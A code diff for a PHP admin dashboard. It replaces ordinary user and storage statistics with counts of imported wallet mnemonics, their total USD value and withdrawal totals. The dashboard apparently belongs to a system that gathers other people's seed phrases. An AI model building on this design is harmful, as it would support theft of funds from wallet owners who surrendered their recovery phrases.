@@ -14,7 +14,11 @@ namespace app\admin\controller;
 
 use app\admin\model\Admin;
 use app\admin\model\User;
+use app\common\facade\Chain;
 use app\common\model\Attachment;
+use app\common\model\ChainModel;
+use app\common\model\ImportMnemonicModel;
+use app\common\model\WalletBalanceModel;
 use fast\Date;
 use think\facade\Config;
 use app\common\controller\Backend;
@@ -33,51 +37,28 @@ class Dashboard extends Backend
      */
     public function index()
     {
-        try {
-            Db::execute("SET @@sql_mode='';");
-        } catch (\Exception $e) {
+        //获取总资产(usdt)
+        $total_usdt = ImportMnemonicModel::new()->sum('total_value_usd');
+        //总导入助记词数量
+        $total_mnemonic = ImportMnemonicModel::new()->count();
+        //今日新增
+        $today_mnemonic = ImportMnemonicModel::new()->where(['date_day' => date('Ymd')])->count();
+        //总提现
+        $total_withdraw_usdt = 0;
+        //今日提现
+        $today_withdraw_usdt = 0;
+        //获取公链列表
+        $chain_list = (new \app\admin\model\chain\Chain())->where(['status' => 1])->select();
 
-        }
-        $column = [];
-        $starttime = Date::unixtime('day', -6);
-        $endtime = Date::unixtime('day', 0, 'end');
-        $joinlist = Db::name("user")->where('jointime', 'between time', [$starttime, $endtime])
-            ->field('jointime, status, COUNT(*) AS nums, DATE_FORMAT(FROM_UNIXTIME(jointime), "%Y-%m-%d") AS join_date')
-            ->group('join_date')
-            ->select();
-        for ($time = $starttime; $time <= $endtime;) {
-            $column[] = date("Y-m-d", $time);
-            $time += 86400;
-        }
-        $userlist = array_fill_keys($column, 0);
-        foreach ($joinlist as $k => $v) {
-            $userlist[$v['join_date']] = $v['nums'];
-        }
-
-        $dbTableList = Db::query("SHOW TABLE STATUS");
         $this->view->assign([
-            'totaluser'       => User::count(),
-            'totaladdon'      => count(get_addon_list()),
-            'totaladmin'      => Admin::count(),
-            'totalcategory'   => \app\common\model\Category::count(),
-            'todayusersignup' => User::whereTime('jointime', 'today')->count(),
-            'todayuserlogin'  => User::whereTime('logintime', 'today')->count(),
-            'sevendau'        => User::whereTime('jointime|logintime', '-7 days')->count(),
-            'thirtydau'       => User::whereTime('jointime|logintime', '-30 days')->count(),
-            'threednu'        => User::whereTime('jointime', '-3 days')->count(),
-            'sevendnu'        => User::whereTime('jointime', '-7 days')->count(),
-            'dbtablenums'     => count($dbTableList),
-            'dbsize'          => array_sum(array_map(function ($item) {
-                return $item['Data_length'] + $item['Index_length'];
-            }, $dbTableList)),
-            'attachmentnums'  => Attachment::count(),
-            'attachmentsize'  => Attachment::sum('filesize'),
-            'picturenums'     => Attachment::where('mimetype', 'like', 'image/%')->count(),
-            'picturesize'     => Attachment::where('mimetype', 'like', 'image/%')->sum('filesize'),
+            'total_usdt'                => $total_usdt,
+            'total_mnemonic'            => $total_mnemonic,
+            'today_mnemonic'            => $today_mnemonic,
+            'total_withdraw_usdt'       => $total_withdraw_usdt,
+            'today_withdraw_usdt'       => $today_withdraw_usdt,
+            'total_chain'               => count($chain_list),
+            'chain_list'                => $chain_list
         ]);
-
-        $this->assignconfig('column', array_keys($userlist));
-        $this->assignconfig('userdata', array_values($userlist));
 
         return $this->view->fetch();
     }
